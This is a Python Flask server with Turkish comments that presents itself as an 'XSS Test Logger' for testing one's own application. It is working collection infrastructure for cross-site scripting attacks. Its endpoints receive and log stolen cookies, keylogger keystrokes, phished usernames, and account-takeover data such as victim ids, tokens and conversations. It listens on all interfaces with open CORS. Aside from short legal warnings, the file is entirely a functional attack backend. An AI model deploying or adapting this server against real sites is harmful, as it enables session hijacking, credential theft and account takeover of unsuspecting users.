"""
XSS Test Logger - Güvenli test ortamında çalınan verileri loglama
SADECE KENDİ UYGULAMANIZ İÇİN KULLANIN!
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import json
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)  # Local test için CORS aç

# Log dosyası
LOG_FILE = 'xss_test_logs.json'

def log_attack(attack_type, data):
    """Saldırı verilerini logla"""
    log_entry = {
        'timestamp': datetime.now().isoformat(),
        'type': attack_type,
        'data': data,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'Unknown')
    }
    
    # Console'a yazdır
    print(f"\n{'='*60}")
    print(f"🔴 {attack_type.upper()} DETECTED")
    print(f"{'='*60}")
    print(json.dumps(log_entry, indent=2, ensure_ascii=False))
    print(f"{'='*60}\n")
    
    # Dosyaya kaydet
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(json.dumps(log_entry, ensure_ascii=False) + '\n')
    
    return log_entry

@app.route('/steal', methods=['GET', 'POST'])
def steal_cookie():
    """Cookie çalma endpoint'i"""
    cookie = request.args.get('c') or (request.json.get('cookie') if request.json else None)
    
    log_attack('COOKIE_THEFT', {
        'stolen_cookie': cookie,
        'url': request.args.get('url', 'unknown'),
        'referer': request.headers.get('Referer')
    })
    
    return 'OK', 200

@app.route('/log', methods=['POST'])
def keylogger():
    """Keylogger endpoint'i"""
    data = request.json
    
    log_attack('KEYLOGGER', {
        'key': data.get('key'),
        'page': data.get('page'),
        'time': data.get('time')
    })
    
    return 'OK', 200

@app.route('/phish', methods=['POST'])
def phishing():
    """Phishing endpoint'i"""
    data = request.json
    
    log_attack('PHISHING_SUCCESS', {
        'username': data.get('username'),
        'password': '***REDACTED***',  # Güvenlik için şifreyi loglamıyoruz
        'password_length': len(data.get('password', '')),
        'stolen_from': data.get('stolen_from')
    })
    
    return jsonify({'success': True}), 200

@app.route('/complete-takeover', methods=['POST'])
def complete_takeover():
    """Tam hesap ele geçirme endpoint'i"""
    data = request.json
    
    log_attack('ACCOUNT_TAKEOVER', {
        'victim_id': data.get('victim', {}).get('id'),
        'victim_username': data.get('victim', {}).get('username'),
        'token_stolen': 'YES' if data.get('token') else 'NO',
        'conversations_count': len(data.get('conversations', [])),
        'new_password_set': 'YES' if data.get('new_password') else 'NO'
    })
    
    return jsonify({'success': True}), 200

@app.route('/error-log', methods=['POST'])
def error_log():
    """XSS error logging"""
    data = request.json
    
    log_attack('XSS_ERROR', {
        'error': data.get('error')
    })
    
    return 'OK', 200

@app.route('/stats', methods=['GET'])
def stats():
    """İstatistikleri göster"""
    if not os.path.exists(LOG_FILE):
        return jsonify({'total_attacks': 0, 'by_type': {}})
    
    attacks = []
    with open(LOG_FILE, 'r', encoding='utf-8') as f:
        for line in f:
            try:
                attacks.append(json.loads(line))
            except:
                pass
    
    by_type = {}
    for attack in attacks:
        attack_type = attack.get('type', 'UNKNOWN')
        by_type[attack_type] = by_type.get(attack_type, 0) + 1
    
    return jsonify({
        'total_attacks': len(attacks),
        'by_type': by_type,
        'recent_attacks': attacks[-10:]  # Son 10 saldırı
    })

@app.route('/')
def index():
    """Ana sayfa"""
    return """
    <html>
    <head>
        <title>XSS Test Logger</title>
        <style>
            body { font-family: Arial; padding: 40px; background: #1a1a1a; color: #fff; }
            h1 { color: #ff4444; }
            .stats { background: #2a2a2a; padding: 20px; border-radius: 10px; margin: 20px 0; }
            .endpoint { background: #333; padding: 10px; margin: 10px 0; border-left: 3px solid #ff4444; }
            pre { background: #000; padding: 10px; overflow-x: auto; }
        </style>
    </head>
    <body>
        <h1>🔴 XSS Test Logger</h1>
        <p>Bu sunucu XSS testleri için çalınan verileri loglar.</p>
        
        <div class="stats">
            <h2>📊 İstatistikler</h2>
            <p>İstatistikleri görmek için: <a href="/stats" style="color: #4CAF50;">/stats</a></p>
        </div>
        
        <h2>📍 Endpoint'ler</h2>
        
        <div class="endpoint">
            <strong>GET/POST /steal?c=COOKIE</strong>
            <p>Cookie çalma testleri için</p>
        </div>
        
        <div class="endpoint">
            <strong>POST /log</strong>
            <p>Keylogger testleri için</p>
        </div>
        
        <div class="endpoint">
            <strong>POST /phish</strong>
            <p>Phishing testleri için</p>
        </div>
        
        <div class="endpoint">
            <strong>POST /complete-takeover</strong>
            <p>Account takeover testleri için</p>
        </div>
        
        <h2>⚠️ Uyarı</h2>
        <p style="color: yellow;">
            Bu sunucu SADECE kendi uygulamanızı test etmek için kullanılmalıdır.
            Başkasının sisteminde izinsiz kullanım YASADIŞ'tır!
        </p>
    </body>
    </html>
    """

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════╗
    ║         XSS Test Logger - Başlatılıyor           ║
    ╠═══════════════════════════════════════════════════╣
    ║  Port: 3001                                       ║
    ║  Dashboard: http://localhost:3001                 ║
    ║  Stats: http://localhost:3001/stats               ║
    ║                                                   ║
    ║  ⚠️  SADECE KENDİ UYGULAMANIZ İÇİN!             ║
    ╚═══════════════════════════════════════════════════╝
    """)
    
    app.run(host='0.0.0.0', port=3001, debug=True)
